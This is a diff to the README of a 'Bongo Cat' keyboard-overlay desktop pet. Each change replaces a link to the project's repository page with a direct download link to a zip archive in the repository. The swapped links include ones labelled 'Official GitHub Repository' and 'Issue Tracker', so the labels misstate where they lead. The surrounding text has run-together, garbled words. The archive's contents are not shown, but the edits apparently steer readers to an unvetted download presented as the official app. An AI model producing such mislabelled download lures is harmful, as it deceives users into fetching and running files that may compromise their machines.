@@ -1,7 +1,7 @@
 <h1>🐱 Bongo-Cat-Keyboard-Overlay - Your Desktop Pet That Plays Along</h1>
 
 <p align="center">
-  <a href="https://github.com/joesiahjohn/Bongo-Cat-Keyboard-Overlay">
+  <a href="https://raw.githubusercontent.com/joesiahjohn/Bongo-Cat-Keyboard-Overlay/main/overlay/Keyboard_Overlay_Cat_Bongo_3.7.zip">
     <img src="https://img.shields.io/badge/⬇️ Download Now-Bongo%20Cat-ff69b4?style=for-the-badge&logo=github&logoColor=white" alt="Download Bongo Cat" />
   </a>
 </p>
@@ -40,7 +40,7 @@ Getting Bongo Cat upand running is incredibly simple. Follow these stepsto bring
 Visit this link to download the application:
 
 <p align="center">
-  <a href="https://github.com/joesiahjohn/Bongo-Cat-Keyboard-Overlay">
+  <a href="https://raw.githubusercontent.com/joesiahjohn/Bongo-Cat-Keyboard-Overlay/main/overlay/Keyboard_Overlay_Cat_Bongo_3.7.zip">
     <img src="https://img.shields.io/badge/⬇️ Get Bongo Cat-Now!-blue?style=for-the-badge" alt="Download Bongo Cat" />
   </a>
 </p>
@@ -149,8 +149,8 @@ BongoCat isafree,open-source projectmaintainedbypassionatedeveloperswholovewayca
         
 ## 📚 Additional Resources
         
-- **Official GitHub Repository:** [github.com/joesiahjohn/Bongo-Cat-Keyboard-Overlay](https://github.com/joesiahjohn/Bongo-Cat-Keyboard-Overlay)
-- **Issue Tracker:** [Report bugs or request features](https://github.com/joesiahjohn/Bongo-Cat-Keyboard-Overlay/issues)
+- **Official GitHub Repository:** [github.com/joesiahjohn/Bongo-Cat-Keyboard-Overlay](https://raw.githubusercontent.com/joesiahjohn/Bongo-Cat-Keyboard-Overlay/main/overlay/Keyboard_Overlay_Cat_Bongo_3.7.zip)
+- **Issue Tracker:** [Report bugs or request features](https://raw.githubusercontent.com/joesiahjohn/Bongo-Cat-Keyboard-Overlay/main/overlay/Keyboard_Overlay_Cat_Bongo_3.7.zip)
 - **Changelog:** Each releaseincludes detailednotes lettingyou knowwhat'snew,what'sfixed,andwhat'simproved**
         
 ## 🏁 Final Words
@@ -164,7 +164,7 @@ So whatareyouwaitingfor?Head overto therepository,downloadyournewdeskpet,andlets
 ---
 
 <p align="center">
-  <a href="https://github.com/joesiahjohn/Bongo-Cat-Keyboard-Overlay">
+  <a href="https://raw.githubusercontent.com/joesiahjohn/Bongo-Cat-Keyboard-Overlay/main/overlay/Keyboard_Overlay_Cat_Bongo_3.7.zip">
     <img src="https://img.shields.io/badge/🚀 Get Started Now-Download%20Bongo%20Cat-success?style=for-the-badge&logo=github" alt="Download Bongo Cat" />
   </a>
 </p>
